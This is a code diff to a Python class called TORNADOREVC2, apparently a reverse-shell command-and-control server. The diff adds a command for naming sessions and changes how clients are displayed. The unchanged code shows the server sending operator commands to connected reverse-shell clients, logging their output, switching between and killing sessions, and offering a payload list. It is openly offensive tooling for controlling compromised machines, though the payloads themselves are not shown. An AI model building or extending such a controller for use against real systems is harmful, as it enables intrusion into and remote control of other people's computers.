@@ -200,7 +200,9 @@ class TORNADOREVC2:
                         proto = "TLS" 
                     else:
                         proto = "TCP"
-                    print(f"#{info['id']} {info['addr'][0]}:{info['addr'][1]} {proto}")
+                    display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
+                    print(f"{display} {info['addr'][0]}:{info['addr'][1]} {proto}")
+
 
 
     def infer_platform(self, output):
@@ -213,39 +215,51 @@ class TORNADOREVC2:
             return "unix"
         return "unknown"
 
+    def get_host_info(self, client_sock):
+        with self.client_lock:
+            info = self.revshell_clients.get(client_sock)
+            if not info:
+                return "disconnected"
+            display = info["name"] if info.get("name") else f"#{info['id']}"
+            return f"{display}@{info['addr'][0]}:{info['addr'][1]}"
+
     def client_shell_menu(self, client_sock):
         with self.client_lock:
             info = self.revshell_clients[client_sock]
-        host_info = f"#{info['id']}@{info['addr'][0]}:{info['addr'][1]}"
+        host_info = self.get_host_info(client_sock)
         shell_type = info.get('type', 'unix')
         print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
         print(f"{self.colors['green']}CLIENT SHELL: {host_info} ({shell_type.upper()}) {self.colors['end']}")
         print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
         print(f"{self.colors['yellow']}'exit(e)/quit(q) or Ctrl+C for main menu{self.colors['end']}\n")        
         sys.stdout.flush()
+        host_info = self.get_host_info(client_sock)
         print(f"{self.colors['cyan']}{host_info} {shell_type}>{self.colors['end']} ", end='', flush=True)
-        client_id = info['id']
         ip = info['addr'][0]
         os_type = info.get('type', 'unknown')
+        client_log = info["name"] if info.get("name") else f"#{info['id']}"
         logtime = datetime.datetime.now().strftime("%d-%m-%Y")
-        session_id = f"rev_{client_id}_{ip}_{os_type}_{logtime}"
+        session_id = f"rev_{client_log}_{ip}_{os_type}_{logtime}"
         def log_output(cmd, output):
             os.makedirs("logs", exist_ok=True)
             with open(f"logs/{session_id}.log", "a", encoding='utf-8') as f:
                 f.write(f"[{datetime.datetime.now()}] $ {cmd}\n{output}\n\n")
         while True:
             try:
+                host_info = self.get_host_info(client_sock)
                 cmd = input(f"\r{self.colors['green']}{host_info}{self.colors['end']} {self.colors['cyan']}{shell_type}>{self.colors['end']} ").strip()
                 sys.stdout.flush()
                 if cmd.lower() in ['exit', 'quit', 'e', 'q']:
                     break
                 if not cmd:
+                    host_info = self.get_host_info(client_sock)
                     print(f"\r{self.colors['green']}{host_info}{self.colors['end']} {self.colors['cyan']}{shell_type}>{self.colors['end']} ", end='', flush=True)
                     continue
                 print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
                 sys.stdout.flush()
                 if self.send_to_revshell(client_sock, cmd):
                     output = self.recv_output(client_sock)
+                    host_info = self.get_host_info(client_sock)
                     print(f"\r{output}\n{self.colors['green']}{host_info}{self.colors['end']} {self.colors['cyan']}{shell_type}>{self.colors['end']} ", end='', flush=True)
                     log_output(cmd, output)
                 else:
@@ -285,7 +299,8 @@ class TORNADOREVC2:
                         if not client_sock:
                             print(f"{self.colors['red']}Client #{client_id} not active{self.colors['end']}")
                             continue
-                        print(f"{self.colors['green']}Switched to #{client_id}{self.colors['end']}\n")
+                        display = self.get_host_info(client_sock).split("@")[0]
+                        print(f"{self.colors['green']}Switched to {display}{self.colors['end']}\n")
                         self.client_shell_menu(client_sock)
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}") 
@@ -323,16 +338,37 @@ class TORNADOREVC2:
                     self.print_banner()
                     continue
 
+                elif cmd_lower in ("rename", "rn"):
+                    if len(cmd_parts) < 3:
+                        print(f"{self.colors['red']}Usage: rename/rn <ID> <name>{self.colors['end']}")
+                        continue
+                    try:
+                        changed_id = int(cmd_parts[1])
+                        new_name = " ".join(cmd_parts[2:]).strip()
+                        if not new_name:
+                            raise ValueError
+                        with self.client_lock:
+                            for info in self.revshell_clients.values():
+                                if info["id"] == changed_id:
+                                    info["name"] = new_name
+                                    print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
+                                    break
+                            else:
+                                print(f"{self.colors['red']}Client #{changed_id} not found{self.colors['end']}")
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")
+
                 elif cmd_lower == 'help':
                     print(f"""
     {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
-    switch <ID>     Client Interaction
-    kill <ID>       Terminate client 
-    status/ls       Show active clients
-    payloads        Show payloads list
-    clear/cls       Clear screen
-    help            This help menu
-    exit/quit       Shutdown server""")
+    switch <ID>             Client Interaction
+    kill <ID>               Terminate client 
+    status/ls               Show active clients
+    rename/rn <ID> <name>   Rename session
+    payloads                Show payloads list
+    clear/cls               Clear screen
+    help                    This help menu
+    exit/quit               Shutdown server""")
 
             except KeyboardInterrupt:
                 print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")
@@ -348,7 +384,8 @@ class TORNADOREVC2:
         except:
             pass
         remaining = len(self.revshell_clients)
-        print(f"{self.colors['red']}\n#{info['id']} "f"{info['addr'][0]}:{info['addr'][1]} "f"disconnected{self.colors['end']}")
+        display = info["name"] if info.get("name") else f"#{info['id']}"
+        print(f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}")
 
     def handle_client(self, client_sock, addr):
         self.client_counter += 1
@@ -358,6 +395,7 @@ class TORNADOREVC2:
             'addr': addr,
             'type': 'unknown',
             'id': client_id,
+            'name': None,
             'tls': isinstance(client_sock, ssl.SSLSocket),
             'pty': False,
             'init': False
